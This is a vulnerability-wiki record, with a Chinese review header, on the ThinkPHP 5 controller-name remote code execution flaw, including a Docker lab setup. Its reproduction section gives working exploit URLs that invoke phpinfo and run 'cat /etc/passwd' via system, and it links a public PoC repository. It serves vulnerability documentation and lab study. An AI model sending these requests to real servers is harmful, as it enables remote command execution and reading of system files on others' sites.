---
version: ""
source: "Threekiii/Vulnerability-Wiki"
product: "ThinkPHP / 控制器名反射调用"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
version_notes: "docker-compose up -d"
title: "ThinkPHP5-5.0.22-5.1.29-远程代码执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：标题5.0.22/5.1.29，正文泛5，实验5.0.20；需要未强制路由和可用模块"
side_effects: "未执行；本文需注意的操作影响：此条控制器反射调用与 Request `_method` 属性覆盖是不同入口/补丁，应保留关系而不混做同一 PoC。请求结果位置空白，phpinfo/system URL 只是演示；不能把启动命令当影响版本，需具体 5.0/5.1 维护分支及路由配置。"
source_status: "unknown"
id: "vw-c22d2bd38ba9ad764e6687a0"
entity_id: "ve-c22d2bd38ba9ad764e6687a0"
schema_version: "1"
---

## 核对与使用边界

- 此条控制器反射调用与 Request `_method` 属性覆盖是不同入口/补丁，应保留关系而不混做同一 PoC。请求结果位置空白，phpinfo/system URL 只是演示；不能把启动命令当影响版本，需具体 5.0/5.1 维护分支及路由配置。

- 明确更正：原 version 字段抽入命令、源码、路径、配置或普通叙述，不是版本号，已清空机器版本字段并原样保留于 version_notes；实际版本/分支条件见本节逐篇记录，未从代码猜造版本。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：标题5.0.22/5.1.29，正文泛5，实验5.0.20；需要未强制路由和可用模块

代码与实验材料：有phpinfo、system的完整URL，结果留白

来源证据范围：官方话题、先知、第三方工具链接

- **事实待核（1）**：version元数据污染；依据：字段为docker-compose up -d。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（2）**：影响范围和标题不完整；依据：标题是两个样例版本，不能替代5.0/5.1分支修复阈值。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（3）**：实验附件缺失；依据：compose目录及响应结果未提供。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞

## 漏洞描述

ThinkPHP 是一款运用极广的 PHP 开发框架。其版本 5 中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。

参考链接：

- http://www.thinkphp.cn/topic/60400.html
- http://www.thinkphp.cn/topic/60390.html
- https://xz.aliyun.com/t/3570

## 环境搭建

运行 ThinkPHP 5.0.20 版本：

```
docker-compose up -d
```

环境启动后，访问 `http://your-ip:8080` 即可看到 ThinkPHP 默认启动页面。

## 漏洞复现

直接访问 `http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`，即可执行 phpinfo：




执行系统命令：

```
http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/etc/passwd
```




## 开源 POC/EXP

- https://github.com/sukabuliet/ThinkphpRCE


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
